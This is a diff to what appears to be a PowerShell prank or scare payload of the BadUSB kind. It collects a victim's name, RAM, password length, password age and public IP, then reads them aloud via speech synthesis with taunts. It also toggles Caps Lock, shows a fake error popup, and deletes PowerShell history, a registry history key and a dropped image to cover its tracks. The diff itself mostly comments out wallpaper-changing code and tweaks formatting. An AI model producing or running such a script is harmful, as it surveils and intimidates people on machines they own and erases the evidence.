@@ -182,13 +182,13 @@ public class Params
 }
 "@ 
   
-    $SPI_SETDESKWALLPAPER = 0x0014
-    $UpdateIniFile = 0x01
-    $SendChangeEvent = 0x02
+    # $SPI_SETDESKWALLPAPER = 0x0014
+    # $UpdateIniFile = 0x01
+    # $SendChangeEvent = 0x02
   
-    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
+    # $fWinIni = $UpdateIniFile -bor $SendChangeEvent
   
-    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+    # $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
 
 function Get-email {
@@ -273,11 +273,11 @@ while (1) {
         $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
     }
 }
-echo "it worked"
+Write-Host "it worked"
 
 
 $wshell = New-Object -ComObject Wscript.Shell
-$wshell.Popup("Hello $full_name...", 0, "Error", 32+4)
+$wshell.Popup("Hello $full_name...", 0, "Error", 32 + 4)
 
 
 $s.Speak("Hello $full_name.")
@@ -288,9 +288,11 @@ if ($ram -gt 63) {
 }
 elseif ($ram -gt 31) {
     $s.Speak("You have $ram gigabytes of ram. Decent pc. You dont need that much for watching *THINGS* on the internet $full_name. But a computer this good with no security...")
-} elseif ($ram -gt 15) {
+}
+elseif ($ram -gt 15) {
     $s.Speak("You have $ram gigabytes of ram. Nice amout to run. If you just play games, perfect. Good for watching *THINGS* on the internet.. But no security...")
-} else {
+}
+else {
     $s.Speak("You have $ram gigabytes of ram. Poor you :(. You wont need this pc then.")
 }
 
@@ -298,10 +300,10 @@ $s.sleep(1000)
 
 # if pass is bigger or less then 
 if ($pass -gt 6) {
-    $message = "A password thats $passLength long. Well done. Your not as dumb as you seem, still pretty dumb."
+    $message = "A password thats $passLength chartors long. Well done. Your not as dumb as you seem, still pretty dumb."
 }
 else {
-    $message = "A password thats $passLength short is not secure at all mate. Pretty dumb."
+    $message = "A password thats $passLength chartors long is not secure at all mate. Pretty dumb."
 }
 
 if ($days -gt 30) {
@@ -317,7 +319,7 @@ $s.Speak("You think i am just making this info up, well think again... I am sure
 
 $s.Speak("You starting to believe me now?")
 
-$s.Speak("So if you know anything about public IP's, then you know they are pretty usefull for us. If not, now you do :)... $ip. Wow.")
+$s.Speak("So if you know anything about public IP's, then you know they are pretty usefull for us. If not, now you do :)... $ip. Nice!")
 
 
 $s.Speak("Want to see something cool?")
@@ -335,6 +337,8 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 # Delete powershell history
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+Remove-Item "C:\Users\Public\Documents\test.png"
 
 Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
